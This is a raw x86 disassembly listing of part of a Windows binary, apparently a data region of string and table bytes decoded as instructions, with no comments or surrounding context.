  4235fe:	cmp    DWORD PTR [esi+0x37],eax
  423601:	xor    ebx,DWORD PTR [edi+0x35]
  423604:	ss inc edi
  423606:	pop    ecx
  423607:	dec    eax
  423608:	pop    ecx
  423609:	add    BYTE PTR [ebp+0x35],cl
  42360c:	push   eax
  42360d:	xor    BYTE PTR [edi+0x4f],bl
  423610:	pop    ecx
  423611:	xor    cl,BYTE PTR [edi+0x0]
  423614:	pop    ecx
  423615:	xor    DWORD PTR [esi+0x5f],ecx
  423618:	xor    al,BYTE PTR [edx+0x30]
  42361b:	push   esi
  42361c:	push   esp
  42361d:	inc    ebp
  42361e:	add    BYTE PTR [edi+0x37],al
  423621:	push   esi
  423622:	xor    DWORD PTR [edi+0x49],ebx
  423625:	xor    al,BYTE PTR [esi+0x30]
  423628:	pop    edi
  423629:	ss dec esi
  42362b:	cmp    BYTE PTR [eax],al
  42362d:	pop    edx
  42362e:	xor    eax,0x445f334b
  423633:	xor    BYTE PTR [eax],bh
  423635:	push   ecx
  423636:	push   esi
  423637:	xor    al,0x0
  423639:	push   ebp
  42363a:	pop    eax
  42363b:	inc    edi
  42363c:	xor    DWORD PTR [edi+0x39],ebx
  42363f:	push   esp
  423640:	inc    ebx
  423641:	aaa    
  423642:	inc    esp
  423643:	add    BYTE PTR [edi+0x39],dl
  423646:	ss pop edi
  423648:	dec    eax
  423649:	pop    edx
  42364a:	pop    ecx
  42364b:	inc    edi
  42364c:	push   ebp
  42364d:	pop    edi
  42364e:	push   eax
  42364f:	dec    eax
  423650:	inc    ebx
  423651:	add    BYTE PTR [ebp+0x0],dl
  423654:	xor    al,0x0
  423656:	dec    edi
  423657:	add    BYTE PTR [edi+0x0],bl
  42365a:	cmp    BYTE PTR [eax],al
  42365c:	xor    al,BYTE PTR [eax]
  42365e:	inc    ebx
  42365f:	add    BYTE PTR [edx+0x0],bl
  423662:	inc    ebx
  423663:	add    BYTE PTR [edi],dh
  423665:	add    BYTE PTR [edi+0x0],bl
  423668:	inc    ebx
  423669:	add    BYTE PTR [eax+eax*1+0x0],al
  42366d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423671:	add    BYTE PTR [edx],dh
  423673:	add    BYTE PTR [edi+0x0],bl
  423676:	cmp    BYTE PTR [eax],al
  423678:	dec    esp
  423679:	add    BYTE PTR [esi+0x0],dl
  42367c:	pop    edi
  42367d:	add    BYTE PTR [ecx+0x0],bl
  423680:	push   edx
  423681:	add    BYTE PTR [esi+0x0],dl
  423684:	xor    al,BYTE PTR [eax]
  423686:	cmp    BYTE PTR [eax],al
  423688:	pop    edi
  423689:	add    BYTE PTR [edx+0x0],cl
  42368c:	add    BYTE PTR [eax],al
  42368e:	inc    edx
  42368f:	add    BYTE PTR [eax+eax*1+0x46],cl
  423693:	add    BYTE PTR [edi+0x0],bl
  423696:	xor    eax,DWORD PTR [eax]
  423698:	inc    ebp
  423699:	add    BYTE PTR [ecx+0x0],cl
  42369c:	push   edx
  42369d:	add    BYTE PTR [ecx],bh
  42369f:	add    BYTE PTR [esi+0x0],dl
  4236a2:	add    BYTE PTR [eax],al
  4236a4:	dec    ebp
  4236a5:	add    BYTE PTR [edi],dh
  4236a7:	add    BYTE PTR [eax+eax*1+0x5f],al
  4236ab:	add    BYTE PTR [edx+0x0],cl
  4236ae:	pop    eax
  4236af:	add    BYTE PTR [ebx],dh
  4236b1:	add    BYTE PTR [ecx],dh
  4236b3:	add    BYTE PTR [ebx+0x0],al
  4236b6:	add    BYTE PTR [eax],al
  4236b8:	dec    edi
  4236b9:	add    BYTE PTR [esi],dh
  4236bb:	add    BYTE PTR [eax+0x0],cl
  4236be:	pop    edi
  4236bf:	add    BYTE PTR [eax],dh
  4236c1:	add    BYTE PTR [edi],dh
  4236c3:	add    BYTE PTR [ecx],dh
  4236c5:	add    BYTE PTR [edx+0x0],dl
  4236c8:	xor    eax,0x55000000
  4236cd:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4236d1:	add    BYTE PTR [edi+0x0],bl
  4236d4:	push   esp
  4236d5:	add    BYTE PTR [ecx+0x0],al
  4236d8:	cmp    DWORD PTR [eax],eax
  4236da:	pop    edi
  4236db:	add    BYTE PTR [ebx],dh
  4236dd:	add    BYTE PTR [eax],dh
  4236df:	add    BYTE PTR [eax],bh
  4236e1:	add    BYTE PTR [edi+0x0],cl
  4236e4:	inc    ebx
  4236e5:	add    BYTE PTR ds:0x4d000000,dh
  4236eb:	add    BYTE PTR [esi+0x0],cl
  4236ee:	inc    ebp
  4236ef:	add    BYTE PTR [edi+0x0],bl
  4236f2:	push   esp
  4236f3:	add    BYTE PTR [esi+0x0],al
  4236f6:	cmp    BYTE PTR [eax],al
  4236f8:	push   ebx
  4236f9:	add    BYTE PTR [edx+0x0],bl
  4236fc:	pop    edi
  4236fd:	add    BYTE PTR [eax],dh
  4236ff:	add    BYTE PTR [eax],bh
  423701:	add    BYTE PTR [eax+0x0],cl
  423704:	add    BYTE PTR [eax],al
  423706:	dec    esi
  423707:	add    BYTE PTR [edi+0x0],cl
  42370a:	pop    edx
  42370b:	add    BYTE PTR [edi+0x0],bl
  42370e:	add    BYTE PTR ss:[ecx+0x0],bl
  423712:	dec    ebp
  423713:	add    BYTE PTR [esi],dh
  423715:	add    BYTE PTR [ebx],dh
  423717:	add    BYTE PTR [edi+0x0],bl
  42371a:	xor    al,0x0
  42371c:	dec    esi
  42371d:	add    BYTE PTR [edx],dh
  42371f:	add    BYTE PTR [esi],dh
  423721:	add    BYTE PTR [ecx],dh
  423723:	add    BYTE PTR [eax],al
  423725:	add    BYTE PTR [ebx+0x0],cl
  423728:	dec    eax
  423729:	add    BYTE PTR [eax],bh
  42372b:	add    BYTE PTR [edi+0x0],bl
  42372e:	inc    esi
  42372f:	add    BYTE PTR [esi+0x0],al
  423732:	push   esp
  423733:	add    BYTE PTR [edi],dh
  423735:	add    BYTE PTR [esi],dh
  423737:	add    BYTE PTR [edi+0x0],bl
  42373a:	dec    esp
  42373b:	add    BYTE PTR [ecx+0x0],bl
  42373e:	add    BYTE PTR [eax],al
  423740:	push   ebx
  423741:	add    BYTE PTR [ecx+0x0],bl
  423744:	xor    BYTE PTR [eax],al
  423746:	pop    edi
  423747:	add    BYTE PTR [ecx],bh
  423749:	add    BYTE PTR [edx+0x0],dl
  42374c:	dec    eax
  42374d:	add    BYTE PTR [ecx+0x0],bl
  423750:	xor    al,BYTE PTR [eax]
  423752:	pop    edi
  423753:	add    BYTE PTR [eax],dh
  423755:	add    BYTE PTR [eax],al
  423757:	add    BYTE PTR [edx+0x0],al
  42375a:	dec    edx
  42375b:	add    BYTE PTR [esi+0x0],cl
  42375e:	xor    al,BYTE PTR [eax]
  423760:	pop    edi
  423761:	add    BYTE PTR [eax+eax*1+0x33],cl
  423765:	add    BYTE PTR [edx+0x0],dl
  423768:	xor    al,0x0
  42376a:	dec    eax
  42376b:	add    BYTE PTR [eax],al
  42376d:	add    BYTE PTR [ebp+0x0],dl
  423770:	add    BYTE PTR ss:[ebp+0x0],cl
  423774:	xor    DWORD PTR [eax],eax
  423776:	pop    edi
  423777:	add    BYTE PTR [esi],dh
  423779:	add    BYTE PTR [ecx+0x0],bl
  42377c:	push   ebp
  42377d:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423781:	add    BYTE PTR [edi+0x0],cl
  423784:	inc    esp
  423785:	add    BYTE PTR [edi+0x0],dl
  423788:	push   ebx
  423789:	add    BYTE PTR [eax],al
  42378b:	add    BYTE PTR [edx+0x0],bl
  42378e:	inc    ebx
  42378f:	add    BYTE PTR [ebp+0x0],dl
  423792:	pop    edi
  423793:	add    BYTE PTR [ecx],dh
  423795:	add    BYTE PTR [ebp+0x0],al
  423798:	push   esp
  423799:	add    BYTE PTR [eax],dh
  42379b:	add    BYTE PTR [eax],al
  42379d:	add    BYTE PTR [eax],al
  42379f:	add    BYTE PTR [eax],al
  4237a1:	add    BYTE PTR [eax-0x7ffbffbe],al
  4237a7:	inc    edx
  4237a8:	add    BYTE PTR [eax],cl
  4237aa:	add    BYTE PTR [edx+0x0],0xc
  4237ae:	add    BYTE PTR [edx+0x0],0x10
  4237b2:	add    BYTE PTR [edx+0x0],0x14
  4237b6:	add    BYTE PTR [edx+0x0],0x18
  4237ba:	add    BYTE PTR [edx+0x0],0x1c
  4237be:	add    BYTE PTR [edx+0x0],0x20
  4237c2:	add    BYTE PTR [edx+0x0],0x24
  4237c6:	add    BYTE PTR [edx+0x0],0x28
  4237ca:	add    BYTE PTR [edx+0x0],0x0
  4237ce:	add    BYTE PTR [eax],al
  4237d0:	add    BYTE PTR [eax],al
  4237d2:	add    BYTE PTR [eax],al
  4237d4:	xor    ebx,DWORD PTR [edi]
  4237d6:	ja     0x423825
  4237d8:	add    BYTE PTR [eax],al
  4237da:	add    BYTE PTR [eax],al
  4237dc:	add    bh,BYTE PTR [eax]
  4237de:	add    al,BYTE PTR [eax]
  4237e0:	add    DWORD PTR [eax],eax
  4237e2:	add    BYTE PTR [eax],al
  4237e4:	add    DWORD PTR [eax],eax
  4237e6:	add    BYTE PTR [eax],al
  4237e8:	add    DWORD PTR [eax],eax
  4237ea:	add    BYTE PTR [eax],al
  4237ec:	clc    
  4237ed:	aaa    
  4237ee:	add    al,BYTE PTR [eax]
  4237f0:	cld    
  4237f1:	aaa    
  4237f2:	add    al,BYTE PTR [eax]
  4237f4:	add    BYTE PTR [eax],bh
  4237f6:	add    al,BYTE PTR [eax]
  4237f8:	daa    
  4237f9:	mov    BYTE PTR [eax],al
  4237fb:	add    BYTE PTR [esi],cl
  4237fd:	cmp    BYTE PTR [edx],al
  4237ff:	add    BYTE PTR [eax],al
  423801:	add    BYTE PTR [edi+0x6f],dl
  423804:	jb     0x42386a
  423806:	push   edi
  423807:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42380e:	aas    
  42380f:	inc    ebp
  423810:	outs   dx,BYTE PTR ds:[esi]
  423811:	jne    0x423880
  423813:	push   edi
  423814:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42381b:	popa   
  42381c:	je     0x423887
  42381e:	outs   dx,DWORD PTR ds:[esi]
  42381f:	outs   dx,BYTE PTR ds:[esi]
  423820:	jae    0x423875
  423822:	je     0x423885
  423824:	.byte 0x74
